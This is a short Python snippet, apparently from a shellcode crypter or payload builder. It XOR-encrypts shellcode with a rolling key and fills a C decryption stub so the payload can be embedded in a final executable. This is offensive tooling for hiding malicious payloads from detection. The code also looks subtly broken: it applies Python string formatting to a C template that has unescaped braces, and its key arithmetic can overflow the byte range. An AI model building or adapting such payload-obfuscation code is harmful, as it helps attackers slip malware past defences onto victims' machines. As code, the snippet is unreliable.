## Encryption module snippets

encryption_method = None # the encryption method the user has chosen, if at all.
xor_shellcode = "" # the shellcode to be encrypted.
xor_key = "" # if user provides their own key, we'll use that ofc. If not, we'll generate a random key.
xor_enc_shellcode = "" # the encrypted shellcode.

# XOR Snippets:
XOR_DECRYPT = """
unsigned char Shellcode[] = {xor_enc_shellcode};

SIZE_T sShellcodeSize = sizeof(Shellcode);
BYTE bKey = {xor_key};

void XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ (bKey + i);
	}
}
"""


def get_xor_shellcode(shellcode, key):
        enc_shellcode = ""
        for i in range(len(shellcode)):
            enc_shellcode += chr(shellcode[i] ^ (key + i))
        return enc_shellcode


if encryption_method == "xor":
    # generate the xor encryption snippet and generate the encrypted shellcode so we can then include it in the decryption snippet/final executable.
    xor_enc_shellcode = get_xor_shellcode(xor_shellcode, xor_key) # now we can pass xor_enc_shellcode into the decryption snippet.
    xor_decrypt_final = XOR_DECRYPT.format(xor_enc_shellcode=xor_enc_shellcode, xor_key=xor_key)
    print(xor_decrypt_final)
    





